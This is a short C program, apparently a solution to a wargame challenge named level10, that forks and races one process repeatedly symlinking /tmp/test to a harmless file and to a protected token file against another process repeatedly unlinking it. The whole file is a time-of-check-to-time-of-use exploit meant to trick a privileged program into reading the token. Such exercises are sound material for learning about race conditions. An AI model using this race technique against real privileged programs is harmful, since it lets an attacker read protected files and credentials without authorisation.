#include <stdbool.h>
#include <unistd.h>

int main()
{
	pid_t child = fork();

	if (child) {
		while (true) {
			symlink("/tmp/target", "/tmp/test");
			symlink("/home/user/level10/token", "/tmp/test");
		}
	}

	else
		while (true)
			unlink("/tmp/test");

	return 2;
}
